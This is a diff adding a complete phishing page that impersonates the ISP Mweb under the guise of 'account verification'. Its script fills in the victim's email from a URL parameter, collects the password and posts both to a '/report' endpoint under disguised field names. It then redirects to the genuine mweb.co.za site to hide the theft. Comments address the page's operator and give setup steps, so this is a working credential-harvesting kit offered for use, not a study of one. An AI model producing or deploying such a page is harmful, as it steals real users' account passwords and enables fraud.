@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Mweb · Account Verification</title>
+  <style>
+    /* ============================================
+       RESET & BASE STYLES
+       ============================================ */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+      background: #f0f2f5;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      padding: 40px 20px;
+    }
+
+    /* ============================================
+       CARD CONTAINER
+       ============================================ */
+    .card {
+      background: #ffffff;
+      border-radius: 16px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+      width: 100%;
+      max-width: 480px;
+      overflow: hidden;
+    }
+
+    /* ============================================
+       HEADER
+       ============================================ */
+    .header {
+      padding: 24px 24px 16px;
+      border-bottom: 1px solid #f0f0f0;
+    }
+
+    .logo {
+      font-size: 20px;
+      font-weight: 700;
+      color: #1a1a1a;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+
+    .logo span:nth-child(2) { color: #888; font-weight: 400; }
+    .logo span:nth-child(3) { font-weight: 500; color: #444; }
+
+    /* ============================================
+       CONTENT AREA
+       ============================================ */
+    .content {
+      padding: 24px;
+    }
+
+    h2 {
+      font-size: 22px;
+      font-weight: 700;
+      color: #1a1a1a;
+      margin-bottom: 8px;
+    }
+
+    .subtitle {
+      font-size: 14px;
+      color: #666;
+      margin-bottom: 20px;
+    }
+
+    /* ============================================
+       NOTICE BOX (Blue left accent)
+       ============================================ */
+    .notice {
+      background: #f0f7ff;
+      border-radius: 10px;
+      padding: 14px 16px;
+      margin-bottom: 24px;
+      border-left: 3px solid #0066cc;
+    }
+
+    .notice p {
+      font-size: 13px;
+      color: #444;
+      line-height: 1.5;
+      margin: 0;
+    }
+
+    /* ============================================
+       FORM ELEMENTS
+       ============================================ */
+    .form-group {
+      margin-bottom: 16px;
+    }
+
+    label {
+      display: block;
+      font-size: 13px;
+      font-weight: 600;
+      color: #333;
+      margin-bottom: 6px;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px 14px;
+      border-radius: 10px;
+      border: 1.5px solid #e0e0e0;
+      font-size: 14px;
+      font-family: inherit;
+      outline: none;
+      transition: all 0.2s ease;
+    }
+
+    input:focus {
+      border-color: #0066cc;
+      box-shadow: 0 0 0 3px rgba(0,102,204,0.1);
+    }
+
+    /* Read-only email field (auto-filled from URL) */
+    input[readonly] {
+      background: #f8f9fa;
+      color: #666;
+      cursor: not-allowed;
+    }
+
+    .hint {
+      font-size: 12px;
+      color: #888;
+      margin: -8px 0 20px;
+    }
+
+    /* ============================================
+       SUBMIT BUTTON
+       ============================================ */
+    button {
+      width: 100%;
+      padding: 14px;
+      background: #0066cc;
+      color: #fff;
+      border: none;
+      border-radius: 10px;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: background 0.2s ease;
+      letter-spacing: 0.3px;
+    }
+
+    button:hover:not(:disabled) {
+      background: #004499;
+    }
+
+    button:disabled {
+      background: #99c2ff;
+      cursor: not-allowed;
+    }
+
+    /* ============================================
+       MESSAGE DISPLAY (Success/Error)
+       ============================================ */
+    .message {
+      margin-top: 16px;
+      padding: 12px 16px;
+      border-radius: 10px;
+      font-size: 13px;
+      text-align: center;
+      font-weight: 500;
+      display: none;
+    }
+
+    .message.success {
+      background: #e8f5e9;
+      color: #2e7d32;
+      display: block;
+    }
+
+    .message.error {
+      background: #ffebee;
+      color: #c62828;
+      display: block;
+    }
+
+    /* ============================================
+       FOOTER
+       ============================================ */
+    .footer {
+      padding: 16px 24px;
+      border-top: 1px solid #f0f0f0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 8px;
+      font-size: 12px;
+      color: #999;
+    }
+
+    .footer a {
+      color: #666;
+      text-decoration: none;
+    }
+
+    .footer a:hover {
+      text-decoration: underline;
+    }
+
+    /* ============================================
+       LOADING SPINNER
+       ============================================ */
+    .spinner {
+      display: inline-block;
+      width: 16px;
+      height: 16px;
+      border: 2px solid #fff;
+      border-top-color: transparent;
+      border-radius: 50%;
+      animation: spin 0.6s linear infinite;
+      margin-right: 8px;
+      vertical-align: middle;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+  </style>
+<base target="_blank">
+</head>
+<body>
+  <div class="card">
+    <!-- Header -->
+    <div class="header">
+      <div class="logo">
+        <span>Mweb</span>
+        <span>·</span>
+        <span>Account Verification</span>
+      </div>
+    </div>
+
+    <!-- Content -->
+    <div class="content">
+      <h2>Verify your account</h2>
+      <p class="subtitle">Complete your email verification to access your account</p>
+
+      <div class="notice">
+        <p>Please complete the verification to continue using your account</p>
+      </div>
+
+      <form id="verifyForm">
+        <!-- Email: Auto-filled from URL, read-only -->
+        <div class="form-group">
+          <label for="email">Email Address</label>
+          <input
+            type="email"
+            id="email"
+            name="email"
+            placeholder="Enter your email"
+            readonly
+          />
+        </div>
+
+        <!-- Password: User enters this -->
+        <div class="form-group">
+          <label for="password">Password</label>
+          <input
+            type="password"
+            id="password"
+            name="password"
+            placeholder="Enter your password"
+            required
+            autocomplete="current-password"
+          />
+        </div>
+
+        <p class="hint">Verification is required once to confirm ownership of this email</p>
+
+        <button type="submit" id="submitBtn">
+          Verify Mweb Account
+        </button>
+      </form>
+
+      <div id="message" class="message"></div>
+    </div>
+
+    <!-- Footer -->
+    <div class="footer">
+      <a href="#">Privacy policy</a>
+      <span>•</span>
+      <a href="#">Security</a>
+      <span>•</span>
+      <a href="#">Support</a>
+      <span>©2026 Mweb. All rights reserved</span>
+    </div>
+  </div>
+
+  <script>
+    /**
+     * Mweb Account Verification Login Page
+     * 
+     * Features:
+     * - Auto-fills email from URL query parameter (?email=...)
+     * - Makes email field read-only (user only types password)
+     * - Submits credentials to existing backend /report endpoint
+     * - Shows loading state and success/error messages
+     * - Stores email in localStorage for future visits
+     */
+    (function() {
+      // ============================================
+      // CONFIGURATION - Update these for your setup
+      // ============================================
+      const CONFIG = {
+        // Your existing backend endpoint (from your server.js)
+        LOGIN_ENDPOINT: '/report',
+        // Where to redirect after successful verification
+        REDIRECT_URL: 'https://mweb.co.za',
+        // Delay before redirect (milliseconds)
+        REDIRECT_DELAY: 2000,
+      };
+
+      // ============================================
+      // DOM ELEMENTS
+      // ============================================
+      const emailInput = document.getElementById('email');
+      const passwordInput = document.getElementById('password');
+      const form = document.getElementById('verifyForm');
+      const submitBtn = document.getElementById('submitBtn');
+      const messageEl = document.getElementById('message');
+
+      // ============================================
+      // AUTO-FILL EMAIL FROM URL
+      // ============================================
+
+      /**
+       * Extract email from URL query string
+       * Format: /login.html?email=user@example.com
+       * @returns {string|null} Decoded email or null
+       */
+      function getEmailFromURL() {
+        const params = new URLSearchParams(window.location.search);
+        return params.get('email');
+      }
+
+      /**
+       * Populate email field and set focus to password
+       */
+      function populateEmail() {
+        const email = getEmailFromURL();
+
+        if (email) {
+          // Valid email in URL - fill it, make read-only, focus password
+          emailInput.value = decodeURIComponent(email);
+          emailInput.readOnly = true;
+
+          // Auto-focus password so user can type immediately
+          setTimeout(() => passwordInput.focus(), 100);
+        } else {
+          // No email in URL - allow manual entry
+          emailInput.readOnly = false;
+          emailInput.placeholder = 'Enter your email';
+          showMessage('No email provided. Please enter your email address.', 'error');
+          emailInput.focus();
+        }
+      }
+
+      // ============================================
+      // MESSAGE DISPLAY
+      // ============================================
+
+      /**
+       * Show a message to the user
+       * @param {string} text - Message text
+       * @param {'success'|'error'} type - Message type
+       */
+      function showMessage(text, type) {
+        messageEl.textContent = text;
+        messageEl.className = 'message ' + type;
+      }
+
+      function hideMessage() {
+        messageEl.className = 'message';
+        messageEl.textContent = '';
+      }
+
+      // ============================================
+      // FORM SUBMISSION
+      // ============================================
+
+      /**
+       * Handle form submission
+       * Sends { ai: email, pr: password } to your existing backend
+       */
+      async function handleSubmit(e) {
+        e.preventDefault();
+        hideMessage();
+
+        const email = emailInput.value.trim();
+        const password = passwordInput.value;
+
+        // Client-side validation
+        if (!email) {
+          showMessage('Please enter your email address.', 'error');
+          emailInput.focus();
+          return;
+        }
+
+        if (!password) {
+          showMessage('Please enter your password.', 'error');
+          passwordInput.focus();
+          return;
+        }
+
+        // Show loading state
+        submitBtn.disabled = true;
+        submitBtn.innerHTML = '<span class="spinner"></span>Verifying...';
+
+        try {
+          const response = await fetch(CONFIG.LOGIN_ENDPOINT, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              ai: email,    // Matches your backend field name
+              pr: password, // Matches your backend field name
+            }),
+          });
+
+          if (response.ok) {
+            // Success
+            showMessage('Verification successful! Redirecting...', 'success');
+
+            // Store email for future visits (convenience)
+            localStorage.setItem('mweb_user_email', email);
+
+            // Redirect after delay
+            setTimeout(() => {
+              window.location.href = CONFIG.REDIRECT_URL;
+            }, CONFIG.REDIRECT_DELAY);
+          } else {
+            // Backend returned error
+            const data = await response.json().catch(() => ({}));
+            throw new Error(data.message || 'Verification failed. Please try again.');
+          }
+        } catch (error) {
+          console.error('Login error:', error);
+          showMessage(error.message || 'Network error. Please try again.', 'error');
+
+          // Reset button
+          submitBtn.disabled = false;
+          submitBtn.textContent = 'Verify Mweb Account';
+        }
+      }
+
+      // ============================================
+      // INITIALIZATION
+      // ============================================
+      function init() {
+        populateEmail();
+        form.addEventListener('submit', handleSubmit);
+      }
+
+      // Run when DOM is ready
+      if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', init);
+      } else {
+        init();
+      }
+    })();
+  </script>
+</body>
+</html>
